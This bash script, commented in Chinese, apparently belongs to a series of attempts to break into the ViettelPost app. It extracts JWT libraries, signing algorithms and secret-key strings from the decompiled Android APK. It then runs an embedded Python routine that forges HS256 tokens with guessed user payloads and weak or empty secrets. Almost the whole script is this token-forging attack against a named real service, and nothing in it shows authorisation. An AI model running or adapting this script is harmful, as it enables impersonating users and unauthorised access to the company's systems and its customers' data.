#!/bin/bash
# 逆向JWT生成逻辑

DEX_DIR="/workspace/viettelpost_extracted/main_apk"

echo "[🔥] 方案7：逆向JWT生成算法"
echo ""

# 1. 查找JWT相关类
echo "[+] 查找JWT库..."
cd "$DEX_DIR" && strings classes*.dex | grep -iE "jwt|jsonwebtoken" | grep -i "class\|package" | head -20

echo ""
echo "[+] 查找签名算法..."
cd "$DEX_DIR" && strings classes*.dex | grep -E "HS256|HS384|HS512|RS256" | head -20

echo ""
echo "[+] 查找密钥存储..."
cd "$DEX_DIR" && strings classes*.dex | grep -iE "secret.?key|signing.?key|jwt.?key" | head -20

echo ""
echo "[+] 查找token生成方法..."
cd "$DEX_DIR" && strings classes*.dex | grep -iE "generateToken|createToken|buildToken" | head -20

echo ""
echo "[+] 查找SharedPreferences存储..."
cd "$DEX_DIR" && strings classes*.dex | grep -i "SharedPreferences" | grep -i "token\|auth" | head -20

echo ""
echo "[+] 尝试生成简单JWT（HS256 + 空密钥）..."
# 使用Python生成测试JWT
python3 << 'PYTHON'
import base64
import json
import hmac
import hashlib

# Header
header = {"alg": "HS256", "typ": "JWT"}
header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')

# Payload - 尝试不同的payload
payloads = [
    {"sub": "1", "username": "test", "tenantCode": "vtp"},
    {"userId": "1", "role": "user", "tenant": "vtp"},
    {"id": "1", "name": "test", "tenantCode": "viettelpost"},
]

# 尝试常见密钥
secrets = ["", "secret", "vtp", "viettelpost", "123456"]

print("[+] 生成测试JWT Token:")
for payload in payloads:
    for secret in secrets:
        payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
        
        # 签名
        message = f"{header_b64}.{payload_b64}"
        signature = base64.urlsafe_b64encode(
            hmac.new(secret.encode(), message.encode(), hashlib.sha256).digest()
        ).decode().rstrip('=')
        
        token = f"{header_b64}.{payload_b64}.{signature}"
        
        if secret == "":
            print(f"\n[*] Payload: {payload}")
            print(f"[*] Secret: (empty)")
            print(f"[*] Token: {token[:50]}...")
            break
PYTHON
